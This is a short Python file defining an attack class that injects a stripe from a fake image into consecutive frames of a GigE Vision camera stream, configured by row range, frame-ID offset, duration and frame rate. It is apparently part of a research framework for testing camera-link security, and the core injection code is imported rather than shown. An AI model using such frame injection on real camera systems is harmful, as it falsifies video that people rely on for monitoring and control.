from time import time

from attacker import GigEAttacker


class GigEAttackerStripeInjection(GigEAttacker):
    def attack(self) -> None:
        self.gige_link.inject_stripe_consecutive_frames(
            img_path=self.config["injection"]["fake_path"],
            first_row=self.config["injection"]["stripe"]["first_row"],
            num_rows=self.config["injection"]["stripe"]["num_rows"],
            future_id_diff=self.config["injection"]["stripe"]["future_id_diff"],
            count=self.config["injection"]["stripe"]["count"],
            injection_duration=self.config["timing"]["attack_duration_in_seconds"],
            fps=self.config["timing"]["fps"]
        )
